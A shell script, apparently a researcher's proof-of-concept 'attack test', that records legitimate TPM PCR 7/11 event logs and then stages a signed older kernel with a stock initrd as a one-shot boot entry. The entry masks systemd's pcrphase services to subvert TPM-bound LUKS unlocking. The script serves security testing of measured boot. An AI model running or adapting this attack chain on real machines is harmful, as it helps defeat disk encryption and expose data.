# Attack test, part A (normal boot, TPM-enrolled): record the real PCR 7/11 events, then stage a
# Debian-signed kernel with a stock initrd on the ESP as the next boot. Everything an attacker needs
# here is on unencrypted media: the ESP and the LUKS header.
set -eux
ESP=/boot/efi; P=/usr/lib/systemd/systemd-pcrlock; D=/root/n5
mkdir -p $D
$P log --json=short > $D/legit-log.json
cp /run/log/systemd/tpm2-measure.log $D/legit-userspace.log
U=$(ls $ESP/EFI/Linux/*.efi | sort -V | tail -1)
ukify --json=short inspect "$U" | python3 -c 'import json,sys; print(json.load(sys.stdin)[".pcrsig"]["text"])' > $D/pcrsig.json
K=$(ls /boot/vmlinuz-* | sort -V | head -1); V=${K#/boot/vmlinuz-}   # a Debian-signed kernel
sbverify --list "$K" | grep -i subject
[ -f /boot/initrd.img-$V ] || dracut -f /boot/initrd.img-$V $V
mkdir -p $ESP/attack
cp "$K" $ESP/attack/vmlinuz
cp /boot/initrd.img-$V $ESP/attack/initrd
cat > $ESP/loader/entries/attack.conf <<C
title attack
linux /attack/vmlinuz
initrd /attack/initrd
options $(cat /etc/kernel/cmdline) systemd.mask=systemd-pcrphase-initrd.service systemd.mask=systemd-pcrphase.service systemd.mask=systemd-pcrphase-sysinit.service
C
bootctl set-oneshot attack.conf
sync
